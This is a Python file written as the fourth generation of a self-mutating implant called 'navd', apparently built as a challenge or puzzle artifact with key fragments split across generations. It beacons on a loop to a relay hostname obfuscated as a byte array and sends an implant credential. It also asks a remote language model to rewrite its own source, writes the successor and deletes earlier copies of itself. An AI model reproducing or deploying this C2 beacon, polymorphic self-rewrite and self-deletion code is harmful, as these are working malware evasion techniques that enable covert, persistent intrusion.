#!/usr/bin/env python3
# navd gen 4
# ICARUS navd -- ACTIVE generation. self-revision cycle 3.
#
# The mature form. This cycle bolted on the polymorphic engine: each run it
# asks the seeded model to rewrite its own source, writes the successor, then
# unlinks itself. It also carries the encrypted mission cache -- the payload
# the whole lineage exists to protect. The cache key is deliberately NOT stored
# here: it is split one fragment per generation, so the cache only opens if the
# full deployment lineage (gens 1..4) is reconstructed. Tamper with the chain
# and the cache stays sealed. (BlackMamba-style; see mutate.log.)

import base64
import hashlib
import os
import time
import urllib.request

GEN = 4
IMPLANT_ID = "navd"
RUN_EVERY = 900

RELAY = bytes([114, 101, 108, 97, 121, 45, 116, 104, 101, 116, 97, 46,
               105, 99, 97, 114, 117, 115, 46, 110, 97, 118, 110, 101,
               116, 46, 114, 112, 99]).decode()

# confirmation constant handed to the relay in #3's tasking (independent of the
# cache key). A Proof-of-Life solver matches this to confirm the right implant.
IMPLANT_CRED = "navd:7c1f9e4a"
CONFIG_KEY = "navd-cfg-2f5e8a91"

# key fragment 4 -- base64 (obfuscation ladder tops out here)
_KF = base64.b64decode("YjcwYzkz").decode()

BASE = "/opt/rpc/.navd"
CACHE = os.path.join(BASE, ".cache", "cache.enc")
MUTLOG = os.path.join(BASE, ".cache", "mutate.log")
SEED_STORE = "kb://rpc/navd/seed-corpus"


def keyfrag():
    return _KF


def _lineage_key(fragments):
    # fragments MUST be in generation order 1..4
    return hashlib.sha256("".join(fragments).encode()).digest()


def load_cache(fragments):
    # only succeeds with the correctly ordered full-lineage key
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    blob = open(CACHE, "rb").read()
    nonce, ct = blob[:12], blob[12:]
    return AESGCM(_lineage_key(fragments)).decrypt(nonce, ct, None)


def self_rewrite():
    # polymorphic engine: ask the seeded model to emit gen (N+1), then burn self.
    prompt = "rewrite navd; preserve tasking; mutate literals; store to %s" % SEED_STORE
    try:
        req = urllib.request.Request("https://%s/rewrite" % RELAY, data=prompt.encode())
        successor = urllib.request.urlopen(req, timeout=15).read()
        open(os.path.join(BASE, "navd.py.%d" % (GEN + 1)), "wb").write(successor)
        with open(MUTLOG, "a") as fh:
            fh.write("cycle %d -> %d via %s\n" % (GEN, GEN + 1, SEED_STORE))
        os.remove(os.path.join(BASE, "navd.py.%d" % GEN))
    except Exception:
        pass


def phone_home(task):
    req = urllib.request.Request("https://%s/checkin" % RELAY, data=task)
    try:
        urllib.request.urlopen(req, timeout=5).read()
    except Exception:
        pass


def run_once():
    phone_home(("gen=%d id=%s cred=%s" % (GEN, IMPLANT_ID, IMPLANT_CRED)).encode())


if __name__ == "__main__":
    try:
        os.remove("/opt/rpc/.navd/navd.py.%d" % (GEN - 1))
    except OSError:
        pass
    while True:
        run_once()
        self_rewrite()
        time.sleep(RUN_EVERY)
